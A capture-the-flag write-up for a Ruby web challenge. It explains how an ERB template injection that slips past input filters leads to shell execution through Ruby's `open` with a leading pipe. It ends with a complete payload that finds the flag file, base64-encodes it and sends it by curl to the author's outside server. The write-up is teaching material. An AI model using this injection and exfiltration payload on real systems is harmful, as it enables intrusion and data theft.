# master_of_calculator&emsp;<sub><sup>Web, 250 points</sup></sub>

_Writeup by [@bluepichu](https://github.com/bluepichu)_

This problem provides a calculator service in Ruby that does some ROI calculations based on some input parameters.  The only main file of interest is `home_controller.rb`, which checks the inputs against a set of filters, then templates the user's input into an ERB template and evaluates it.

I noticed immediately that `open` and `|` were both not present in the filter, which is important since opening a filename in ruby that starts with `|` will spawn a shell and execute the remainder of the filename as a command.  However, every way of producing a string literal was filtered, as well as parens.

Fortunately, getting around both of these is not too complicated.  Parens around function arguments in single-argument functions are optional in Ruby, so we can just call `open` without parens.  To constuct the string, we can instead use a regular expression literal and then access `.source` on it to get a string with the same content.

However, this is not enough to solve the problem on its own, because all of the places we can insert `open /|command_here/.source` will be positions where some other operation will bind too tightly to either `open` or its argument.  (For example, naively substituting it for `exit_price` wouldn't work because that appears in the expression `(#{exit_price} - #{entry_price})`, and Ruby will complain that strings don't have a `-` method.)  However, you can introduce a block without using braces (which are also filtered) by adding a loop construct; the one I came up with was `1.times do ... end`.

Putting this all together and writing an exploit that wouldn't get filtered, my solution was to submit `1` for `user_leverage`, `user_entry_price`, and `user_exit_price` and submit the following for `user_quantity`:

```
1.times do open /|ls|grep flag|xargs cat|base64|xargs echo http:\/\/pichu.blue\/|sed s\/\\x20\/\/|xargs curl/.source end
```

This script locates the flag file, base64 encodes it, and sends it to my server.